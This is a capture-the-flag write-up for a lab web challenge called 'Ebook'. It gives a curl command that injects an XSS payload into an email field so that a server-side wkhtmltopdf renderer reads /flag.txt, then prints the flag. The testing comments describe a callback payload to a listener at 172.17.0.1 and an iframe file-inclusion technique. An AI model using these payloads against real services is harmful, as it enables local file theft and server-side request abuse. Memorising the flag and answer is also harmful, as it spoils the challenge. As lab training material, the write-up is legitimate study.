# Ebook

Description: Do you like reading? Check out this website to get a preview of some great books.

# Solution

If the below command does not work you might need to update the cookie with a valid one create a user and login

```bash
curl 'http://localhost:5000/order/1' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: ebook=eyJpZCI6MX0.YXmnrw.hjhKtxLI7SLBTElSlCbJp7XVLDw' \
  --data-raw '{"email":["ignacio.dominguez95@gmail.com","<script>x=new XMLHttpRequest;x.onload=function(){document.body.appendChild(document.createTextNode(this.responseText))};x.open(\"GET\",\"file:///flag.txt\");x.send();</script>"]}'
```

# Flag

flag{1bf6c08dfe83a9d42e77c6915b0260f5}

# Testing Comments

This took me a couple hours to work through and was a fun experience. The fact that it's a blackbox challenge that requires you to figure out what's going on with the backend by poking around is nice as well.

There seems to be a logical sequence to the solution. The ebook service allows you to send a PDF to a user supplied email. The service actually sends this email along with the PDF attached. Looking inside the PDF, you can see that your email address (and anything else that you send along in the "email" field to the endpoint) is embedded within the PDF.

This functionality leads you to explore possible XSS payloads to see if any of them are potentially triggered on the backend. Setting up a listener and using something as simple as `<script>window.location='http://172.17.0.1:9999'</script>` allows you to receive a request initiated by the server. By inspecting the `User-Agent` header of this request you can see that the PDF is generated by `wkhtmltopdf`.

Searching for `wkhtmltopdf` exploits will lead you to a [file inclusion vulnerability](https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/) that can use an iframe to embed the flag (found at `/flag.txt`) within a PDF that is then emailed to you. Based on the provided solution above, it looks like you could use the XSS functionality to just directly send the flag to yourself as well.
